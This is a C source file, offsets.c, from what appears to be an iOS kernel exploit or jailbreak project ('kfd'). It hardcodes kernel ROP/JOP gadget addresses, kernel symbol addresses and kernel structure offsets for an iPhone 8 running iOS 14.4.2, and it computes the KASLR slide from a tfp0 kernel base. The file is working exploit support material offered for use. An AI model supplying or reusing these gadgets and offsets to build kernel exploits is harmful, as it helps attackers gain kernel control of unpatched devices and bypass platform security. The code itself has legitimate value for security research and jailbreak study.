//
//  offsets.c
//  kfd
//
//  Created by Seo Hyun-gyu on 2023/07/29.
//

#include "offsets.h"
#include <stdint.h>
#include <UIKit/UIKit.h>
#include <Foundation/Foundation.h>

extern uint64_t tfp0_kbase;

#define SYSTEM_VERSION_EQUAL_TO(v)                  ([[[UIDevice currentDevice] systemVersion] compare:v options:NSNumericSearch] == NSOrderedSame)
#define SYSTEM_VERSION_GREATER_THAN(v)              ([[[UIDevice currentDevice] systemVersion] compare:v options:NSNumericSearch] == NSOrderedDescending)
#define SYSTEM_VERSION_GREATER_THAN_OR_EQUAL_TO(v)  ([[[UIDevice currentDevice] systemVersion] compare:v options:NSNumericSearch] != NSOrderedAscending)
#define SYSTEM_VERSION_LESS_THAN(v)                 ([[[UIDevice currentDevice] systemVersion] compare:v options:NSNumericSearch] == NSOrderedAscending)
#define SYSTEM_VERSION_LESS_THAN_OR_EQUAL_TO(v)     ([[[UIDevice currentDevice] systemVersion] compare:v options:NSNumericSearch] != NSOrderedDescending)

uint64_t *gadgets = NULL;
uint64_t *symbols = NULL;
uint64_t tfp0_kaslr_slide = 0;

/* iOS 14.4.2 */
uint64_t kgadgets_iphone_8_18d70[] = {
    0xFFFFFFF0085DEE04, // KGADGET_POPULATE
    0xFFFFFFF008950124, // KGADGET_PROLOGUE
    0xFFFFFFF0087BD4F4, // KGADGET_MOV_X15_X2__BR_X3
    0xFFFFFFF0088191C0, // KGADGET_MOV_X10_X0__BR_X2
    0xFFFFFFF00874C65C, // KGADGET_MOV_X12_X0__BR_x2
    0xFFFFFFF0087E8564, // KGADGET_MOV_X16_X15__BR_X12
    0xFFFFFFF008801D90, // KGADGET_MOV_X7_X16__BR_X10
    0xFFFFFFF00877A80C, // KGADGET_MOV_X10_X0__BR_X12
    0xFFFFFFF008754D50, // KGADGET_MOV_X13_X2__BR_X12
    0xFFFFFFF00881B5CC, // KGADGET_MOV_X4_X13__BR_X15
    0xFFFFFFF007A9EEBC, // KGADGET_ADD_X0_X0_0X40__RET
};

uint64_t kgad(enum kgadget gad)
{
    tfp0_kaslr_slide = tfp0_kbase - 0xFFFFFFF007004000;

    return gadgets[gad] + tfp0_kaslr_slide;
}

uint64_t ksymbols_iphone_8_18d70[] = {
    0xFFFFFFF00773C468, // KSYMBOL_KERNPROC
    0xFFFFFFF007D52960, // KSYMBOL_RET_300
    0xFFFFFFF007A618E8, // KSYMBOL_KFREE
    0xFFFFFFF007A61918, // KSYMBOL_KFREE_EXT
    0xFFFFFFF009166C28, // KSYMBOL_PANIC
    0xFFFFFFF007A61498, // KSYMBOL_KALLOC_EXT
    0xFFFFFFF00770E948, // KSYMBOL_KHEAP_DATA_BUFFERS
    0xFFFFFFF00770E5D0, // KSYMBOL_KHEAP_DEFAULT
    0xFFFFFFF00770EAE8, // KSYMBOL_KHEAP_KEXT
    0xFFFFFFF0091A6A50, // KSYMBOL___ZZnamE4site (will be used with KHEAP_KEXT)
    0xFFFFFE000711F090, // KSYMBOL_KERN_OS_MALLOC
    0xFFFFFFF007FCE154, // KSYMBOL_IOMallocZero_external (type = KEXT)
    0xFFFFFFF007FA1BA8, // KSYMBOL____Znam  //alloc by __ZN5IOMFB16TableCompensator15BilerpGainTable13new_from_dataEPK18IOMFBLUTTableStateijPKiS6_i+0xa8, type = KERN_OS_MALLOC
    0xFFFFFFF009183C28, // KSYMBOL__necp_set_socket_attributes_site
};

uint64_t ksym(enum ksymbol sym)
{
    tfp0_kaslr_slide = tfp0_kbase - 0xFFFFFFF007004000;

    return symbols[sym] + tfp0_kaslr_slide;
}

uint32_t off_ipc_port_ip_kobject = 0;
uint32_t off_task_itk_space = 0;
uint32_t off_ipc_space_is_table = 0;
uint32_t off_p_pid = 0;
uint32_t off_p_list_le_prev = 0;
uint32_t off_p_task = 0;
uint32_t off_p_pfd = 0;
uint32_t off_fg_data = 0;
uint32_t off_fp_fglob = 0;
uint32_t off_pb_buffer = 0;
uint32_t off_pb_cnt = 0;

void offsets_init(void) {
    if (!(SYSTEM_VERSION_EQUAL_TO(@"14.4.2"))) {
        printf("[-] Only supported offset for iOS 14.4.2\n");
        exit(EXIT_FAILURE);
    }
    
    if (SYSTEM_VERSION_EQUAL_TO(@"14.4.2")) {
        printf("[i] offsets selected for iOS 14.4.2\n");

        off_ipc_port_ip_kobject = 0x68;
        off_task_itk_space = 0x330;
        off_ipc_space_is_table = 0x20;

        off_p_pid = 0x68;

        off_p_list_le_prev = 0x8;

        off_p_task = 0x10;

        off_p_pfd = 0xf8;

        off_fg_data = 0x38;
        off_fp_fglob = 0x10;
        off_pb_buffer = 0x10;
        off_pb_cnt = 0x0;
        
        gadgets = kgadgets_iphone_8_18d70;
        symbols = ksymbols_iphone_8_18d70;
    }
}
